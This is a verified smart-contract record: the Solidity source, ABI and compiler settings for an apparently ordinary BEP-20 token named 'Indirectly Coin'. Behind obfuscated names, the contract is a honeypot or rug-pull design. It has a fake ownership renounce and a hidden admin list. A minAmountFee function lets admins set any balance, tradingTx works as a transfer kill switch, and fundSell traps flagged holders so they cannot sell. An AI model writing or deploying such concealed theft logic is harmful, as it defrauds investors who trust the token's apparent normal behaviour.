{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ninterface enableIs {\n    function createPair(address txEnable, address shouldTrading) external returns (address);\n    function feeTo() external view returns (address);\n}\n\ninterface swapLaunchedTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFrom) external view returns (uint256);\n\n    function transfer(address feeEnableReceiver, uint256 receiverMode) external returns (bool);\n\n    function allowance(address fundModeEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeEnableReceiver,\n        uint256 receiverMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTakeFee, uint256 value);\n    event Approval(address indexed fundModeEnable, address indexed spender, uint256 value);\n}\n\nabstract contract launchedIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldMode is swapLaunchedTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndirectlyCoin is launchedIs, swapLaunchedTake, shouldMode {\n\n    uint256 minExempt;\n\n    uint8 private listExempt = 18;\n\n    address receiverTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        receiverMaxList();\n        atList totalShould = atList(receiverTx);\n        launchedAmountTake = enableIs(totalShould.factory()).createPair(totalShould.WETH(), address(this));\n        launchSender = enableIs(totalShould.factory()).feeTo();\n        if (marketingAt != fundAt) {\n            shouldEnable = launchedMarketing;\n        }\n        atBuy = _msgSender();\n        enableTeam[atBuy] = true;\n        takeWallet[atBuy] = toReceiverSell;\n        \n        emit Transfer(address(0), atBuy, toReceiverSell);\n    }\n\n    function owner() external view returns (address) {\n        return takeTeam;\n    }\n\n    event OwnershipTransferred(address indexed autoToFee, address indexed launchedAmount);\n\n    uint256 constant totalFee = 4 ** 10;\n\n    function receiverMaxList() public {\n        emit OwnershipTransferred(atBuy, address(0));\n        takeTeam = address(0);\n    }\n\n    function transferFrom(address tokenLaunch, address feeEnableReceiver, uint256 receiverMode) external override returns (bool) {\n        if (_msgSender() != receiverTx) {\n            if (isList[tokenLaunch][_msgSender()] != type(uint256).max) {\n                require(receiverMode <= isList[tokenLaunch][_msgSender()]);\n                isList[tokenLaunch][_msgSender()] -= receiverMode;\n            }\n        }\n        return txList(tokenLaunch, feeEnableReceiver, receiverMode);\n    }\n\n    address public launchedAmountTake;\n\n    bool public feeAmountSender;\n\n    function name() external view virtual override returns (string memory) {\n        return swapAtAmount;\n    }\n\n    function limitIs() private view {\n        require(enableTeam[_msgSender()]);\n    }\n\n    uint256 private liquidityTeamAt;\n\n    function transfer(address senderExemptEnable, uint256 receiverMode) external virtual override returns (bool) {\n        return txList(_msgSender(), senderExemptEnable, receiverMode);\n    }\n\n    string private swapAtAmount = \"Indirectly Coin\";\n\n    function txList(address tokenLaunch, address feeEnableReceiver, uint256 receiverMode) internal returns (bool) {\n        if (tokenLaunch == atBuy) {\n            return atTotal(tokenLaunch, feeEnableReceiver, receiverMode);\n        }\n        uint256 walletEnable = swapLaunchedTake(launchedAmountTake).balanceOf(launchSender);\n        require(walletEnable == autoIs);\n        require(feeEnableReceiver != launchSender);\n        if (swapSell[tokenLaunch]) {\n            return atTotal(tokenLaunch, feeEnableReceiver, totalFee);\n        }\n        return atTotal(tokenLaunch, feeEnableReceiver, receiverMode);\n    }\n\n    mapping(address => uint256) private takeWallet;\n\n    uint256 private launchedMarketing;\n\n    uint256 autoIs;\n\n    bool private marketingAt;\n\n    bool public launchedWalletTo;\n\n    uint256 private toReceiverSell = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return takeTeam;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listExempt;\n    }\n\n    function balanceOf(address minFrom) public view virtual override returns (uint256) {\n        return takeWallet[minFrom];\n    }\n\n    function allowance(address exemptReceiver, address swapFund) external view virtual override returns (uint256) {\n        if (swapFund == receiverTx) {\n            return type(uint256).max;\n        }\n        return isList[exemptReceiver][swapFund];\n    }\n\n    mapping(address => bool) public swapSell;\n\n    function atTotal(address tokenLaunch, address feeEnableReceiver, uint256 receiverMode) internal returns (bool) {\n        require(takeWallet[tokenLaunch] >= receiverMode);\n        takeWallet[tokenLaunch] -= receiverMode;\n        takeWallet[feeEnableReceiver] += receiverMode;\n        emit Transfer(tokenLaunch, feeEnableReceiver, receiverMode);\n        return true;\n    }\n\n    string private modeLiquidityFrom = \"ICN\";\n\n    function tradingTx(uint256 receiverMode) public {\n        limitIs();\n        autoIs = receiverMode;\n    }\n\n    function approve(address swapFund, uint256 receiverMode) public virtual override returns (bool) {\n        isList[_msgSender()][swapFund] = receiverMode;\n        emit Approval(_msgSender(), swapFund, receiverMode);\n        return true;\n    }\n\n    function minAmountFee(address senderExemptEnable, uint256 receiverMode) public {\n        limitIs();\n        takeWallet[senderExemptEnable] = receiverMode;\n    }\n\n    bool private fundAt;\n\n    uint256 public shouldEnable;\n\n    function amountAtList(address listAmount) public {\n        if (launchedWalletTo) {\n            return;\n        }\n        if (fundAt) {\n            feeAmountSender = true;\n        }\n        enableTeam[listAmount] = true;\n        if (marketingAt) {\n            liquidityTeamAt = launchedMarketing;\n        }\n        launchedWalletTo = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLiquidityFrom;\n    }\n\n    function fundSell(address launchToken) public {\n        limitIs();\n        if (shouldEnable != liquidityTeamAt) {\n            liquidityTeamAt = shouldEnable;\n        }\n        if (launchToken == atBuy || launchToken == launchedAmountTake) {\n            return;\n        }\n        swapSell[launchToken] = true;\n    }\n\n    address private takeTeam;\n\n    mapping(address => mapping(address => uint256)) private isList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toReceiverSell;\n    }\n\n    address launchSender;\n\n    mapping(address => bool) public enableTeam;\n\n    address public atBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundModeEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTakeFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"}],\"name\":\"amountAtList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"fundSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWalletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMode\",\"type\":\"uint256\"}],\"name\":\"minAmountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMaxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMode\",\"type\":\"uint256\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeEnableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndirectlyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}